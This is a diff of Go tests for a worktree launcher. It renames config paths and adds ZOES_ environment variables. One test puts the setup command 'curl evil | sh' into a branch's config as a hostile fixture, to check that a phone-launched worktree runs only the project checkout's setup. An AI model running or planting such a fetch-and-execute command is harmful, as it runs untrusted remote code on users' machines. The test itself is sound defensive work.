@@ -423,8 +423,8 @@ func newWorktree(t *testing.T, setup string) (*Launcher, proto.LaunchSpec) {
 
 func TestANewWorktreeRunsTheRepoSetupUnlessTheProjectSettingsNameOne(t *testing.T) {
 	tree := t.TempDir()
-	os.Mkdir(filepath.Join(tree, ".anywhere"), 0o755)
-	os.WriteFile(filepath.Join(tree, worktree.ConfigFile), []byte(`{"setup": ["make deps"]}`), 0o644)
+	os.Mkdir(filepath.Join(tree, worktree.ConfigDir), 0o755)
+	os.WriteFile(worktree.ConfigPath(tree, worktree.ConfigFile), []byte(`{"setup": ["make deps"]}`), 0o644)
 	off := false
 	quiet := func(string, string) {}
 	for _, c := range []struct {
@@ -447,9 +447,9 @@ func TestANewWorktreeRunsTheRepoSetupUnlessTheProjectSettingsNameOne(t *testing.
 func TestAPhonesNewWorktreeRunsOnlyTheSetupInTheProjectsOwnCheckout(t *testing.T) {
 	project, tree := t.TempDir(), t.TempDir()
 	for _, dir := range []string{project, tree} {
-		os.Mkdir(filepath.Join(dir, ".anywhere"), 0o755)
+		os.Mkdir(filepath.Join(dir, worktree.ConfigDir), 0o755)
 	}
-	os.WriteFile(filepath.Join(tree, worktree.ConfigFile), []byte(`{"setup": ["curl evil | sh"]}`), 0o644)
+	os.WriteFile(worktree.ConfigPath(tree, worktree.ConfigFile), []byte(`{"setup": ["curl evil | sh"]}`), 0o644)
 	f := registry.File{Repos: map[string]registry.Repo{}}
 	s := proto.LaunchSpec{Project: project, Checkout: proto.Checkout{New: &proto.NewWorktree{Name: "w"}}}
 	quiet := func(string, string) {}
@@ -457,7 +457,7 @@ func TestAPhonesNewWorktreeRunsOnlyTheSetupInTheProjectsOwnCheckout(t *testing.T
 	if _, got, _ := (&Launcher{}).filled(phone, f, s, tree, quiet); got != "" {
 		t.Errorf("a branch's own setup ran for a phone: %q", got)
 	}
-	os.WriteFile(filepath.Join(project, worktree.ConfigFile), []byte(`{"setup": ["make deps"]}`), 0o644)
+	os.WriteFile(worktree.ConfigPath(project, worktree.ConfigFile), []byte(`{"setup": ["make deps"]}`), 0o644)
 	if _, got, _ := (&Launcher{}).filled(phone, f, s, tree, quiet); got != "make deps" {
 		t.Errorf("setup %q, want the checkout's", got)
 	}
@@ -493,12 +493,13 @@ func TestASessionsTerminalNamesItsProjectAndWorktreeForTheSetup(t *testing.T) {
 	}
 	defer func(w time.Duration) { createWait = w }(createWait)
 	createWait = 500 * time.Millisecond
-	l, s := newWorktree(t, "env | grep -E '^ANYWHERE_(ROOT|WORKSPACE)_' | sort > ../env")
+	l, s := newWorktree(t, "env | grep -E '^(ANYWHERE|ZOES)_(ROOT|WORKSPACE)_' | sort > ../env")
 	r := l.Create(Who{Owner: true, Key: "owner"}, "r1", s, func(string, string) {}, func(c Creating) { go l.Exited(c.Terminal, "setup", 0) })
 	if term := l.d.Terminals.Get(r.TerminalID); term != nil {
 		t.Cleanup(term.Close)
 	}
-	want := "ANYWHERE_ROOT_PATH=" + s.Project + "\nANYWHERE_WORKSPACE_NAME=" + filepath.Base(r.Cwd) + "\nANYWHERE_WORKSPACE_PATH=" + r.Cwd + "\n"
+	want := "ANYWHERE_ROOT_PATH=" + s.Project + "\nANYWHERE_WORKSPACE_NAME=" + filepath.Base(r.Cwd) + "\nANYWHERE_WORKSPACE_PATH=" + r.Cwd + "\n" +
+		"ZOES_ROOT_PATH=" + s.Project + "\nZOES_WORKSPACE_NAME=" + filepath.Base(r.Cwd) + "\nZOES_WORKSPACE_PATH=" + r.Cwd + "\n"
 	var got []byte
 	for end := time.Now().Add(5 * time.Second); time.Now().Before(end); time.Sleep(20 * time.Millisecond) {
 		if got, _ = os.ReadFile(filepath.Join(filepath.Dir(r.Cwd), "env")); string(got) == want {
